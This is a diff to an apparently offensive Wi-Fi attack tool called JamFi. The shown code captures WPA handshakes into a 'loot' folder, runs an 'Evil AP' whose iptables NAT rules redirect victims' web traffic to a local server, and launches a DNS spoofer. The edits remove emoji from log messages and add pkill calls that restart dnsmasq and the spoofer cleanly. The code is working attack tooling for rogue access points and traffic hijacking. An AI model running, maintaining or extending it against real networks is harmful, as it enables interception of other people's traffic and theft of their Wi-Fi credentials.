@@ -89,7 +89,7 @@ def scan_clients():
 
 def capture_handshake(iface, bssid):
     path = f"loot/handshake_{bssid.replace(':','')}.pcap"
-    print(f"📡 Capturing handshake to {bssid}, saving to {path}")
+    print(f" Capturing handshake to {bssid}, saving to {path}")
 
     def eapol(pkt):
         return pkt.haslayer(EAPOL) and (
@@ -100,7 +100,7 @@ def capture_handshake(iface, bssid):
         pkts = sniff(iface=iface, lfilter=eapol, timeout=10)
         if pkts:
             wrpcap(path, pkts)
-            print(f"✅ Saved handshake to {path}")
+            print(f" Saved handshake to {path}")
         else:
             print(f"⚠ No handshake captured for {bssid}")
     except Exception as e:
@@ -275,6 +275,10 @@ log-dhcp
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
 
+    subprocess.run(["sudo", "pkill", "-f", "dnsmasq"])
+    subprocess.run(["sudo", "pkill", "-f", "jamfi_dns_spoofer.py"])
+    time.sleep(1) 
+
     print("Launching JamFi DNS spoofer...")
     subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
 
@@ -283,7 +287,7 @@ log-dhcp
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("🛑 Evil AP stopped.")
+        print(" Evil AP stopped.")
     finally:
         cleanup_services(iface)
 
@@ -398,10 +402,12 @@ setTimeout(() => {{
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
     subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
 
+    subprocess.run(["sudo", "pkill", "-f", "dnsmasq"])
+    subprocess.run(["sudo", "pkill", "-f", "jamfi_dns_spoofer.py"])
+    time.sleep(1)  # give the port a sec to clear
+
     print("Starting Python DNS spoofer...")
     subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])
-
-
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
